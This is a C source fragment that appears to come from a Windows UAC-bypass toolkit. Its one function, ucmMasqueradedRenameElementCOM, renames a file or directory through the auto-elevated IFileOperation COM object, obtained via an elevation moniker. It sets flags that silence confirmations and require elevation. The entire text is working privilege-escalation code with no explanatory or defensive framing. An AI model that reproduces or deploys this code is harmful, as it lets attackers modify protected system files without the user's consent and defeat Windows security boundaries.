/*
* ucmMasqueradedRenameElementCOM
*
* Purpose:
*
* Rename file/directory autoelevated.
*
*/
BOOL ucmMasqueradedRenameElementCOM(
    LPWSTR OldName,
    LPWSTR NewName
    )
{
    BOOL                bCond = FALSE, bResult = FALSE;
    IFileOperation     *FileOperation1 = NULL;
    BIND_OPTS3          bop;
    IShellItem         *psiDestDir = NULL;
    HRESULT             r = E_FAIL;

    do {

        if ((OldName == NULL) || (NewName == NULL))
            break;

        r = CoCreateInstance(&CLSID_FileOperation, NULL,
            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &IID_IFileOperation, &FileOperation1);

        if (r != S_OK) {
            break;
        }

        if (FileOperation1 != NULL) {
            FileOperation1->lpVtbl->Release(FileOperation1);
        }

        RtlSecureZeroMemory(&bop, sizeof(bop));
        bop.cbStruct = sizeof(bop);
        bop.dwClassContext = CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER;

        r = CoGetObject(IFILEOP_ELEMONIKER, (BIND_OPTS *)&bop, &IID_IFileOperation, &FileOperation1);
        if (r != S_OK) {
            break;
        }
        if (FileOperation1 == NULL) {
            r = E_FAIL;
            break;
        }

        FileOperation1->lpVtbl->SetOperationFlags(FileOperation1,
            FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);

        r = SHCreateItemFromParsingName(OldName, NULL, &IID_IShellItem, &psiDestDir);
        if (r != S_OK) {
            break;
        }

        r = FileOperation1->lpVtbl->RenameItem(FileOperation1, psiDestDir, NewName, NULL);
        if (r != S_OK) {
            break;
        }

        r = FileOperation1->lpVtbl->PerformOperations(FileOperation1);
        if (r != S_OK) {
            break;
        }

        psiDestDir->lpVtbl->Release(psiDestDir);
        psiDestDir = NULL;

        bResult = TRUE;

    } while (bCond);

    if (FileOperation1 != NULL) {
        FileOperation1->lpVtbl->Release(FileOperation1);
    }

    if (psiDestDir != NULL) {
        psiDestDir->lpVtbl->Release(psiDestDir);
    }

    return bResult;
}